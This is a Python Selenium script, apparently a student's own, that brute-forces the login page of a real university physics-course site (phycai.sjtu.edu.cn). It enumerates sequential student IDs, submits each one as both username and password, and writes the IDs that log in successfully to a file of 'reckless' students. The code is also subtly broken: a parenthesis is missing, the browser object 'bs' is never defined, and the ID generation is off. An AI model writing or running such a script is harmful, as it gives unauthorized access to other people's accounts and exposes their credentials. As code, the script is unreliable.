import webbrowser
import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
import time
import re
def simux(n,x,s):
    if(n==0):
        x.append('521021910'+''.join(s))
        return
    for i in range(0,10):
        s[4-n]=str(i)
        simux(n-1,x,s)
    return
options=webdriver.ChromeOptions()
options.add_argument('--headless')
x=[]
simux(3,x,['','','','']
bs.get(r'http://www.phycai.sjtu.edu.cn/pe/')
cnt=0
pcnt=0
p=[]
for i in x:
    cnt+=1
    if(cnt<45):
        continue
    us1=bs.find_element(By.ID,"login1_StuLoginID")
    us2=bs.find_element(By.ID,"login1_StuPassword")
    us3=bs.find_element(By.ID,"login1_btnLogin")
    us1.clear()
    us2.clear()
    us1.send_keys(i)
    us2.send_keys(i)
    us3.click()
    s=bs.current_url
    if(re.match('.*aspx$',s)):
        p.append(i)
        pcnt+=1
        bs.back()
bs.close()   
with open("C:/Users/Zheng'bo'yang/Desktop/VS_C/spiders/recklessstudens.txt","w+") as f:
    for i in p:
        f.write(i+'\n') 

